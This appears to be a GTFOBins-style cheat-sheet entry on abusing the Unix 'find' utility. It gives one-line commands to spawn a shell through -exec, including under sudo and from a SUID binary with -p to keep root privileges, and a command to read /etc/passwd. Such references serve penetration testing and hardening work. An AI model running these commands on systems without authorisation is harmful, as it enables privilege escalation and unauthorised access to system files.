# find

## Description

`find` is a Unix utility used to search for files and directories. Under certain conditions, it can be abused for privilege escalation.

---

## Shell

```bash
find . -exec /bin/sh \; -quit
```

---

## Sudo

```bash
sudo find . -exec /bin/sh \; -quit
```

---

## SUID

```bash
./find . -exec /bin/sh -p \; -quit
```

---

## File Read

```bash
find . -exec cat /etc/passwd \;
```

---

## References

- https://gtfobins.org/gtfobins/find/
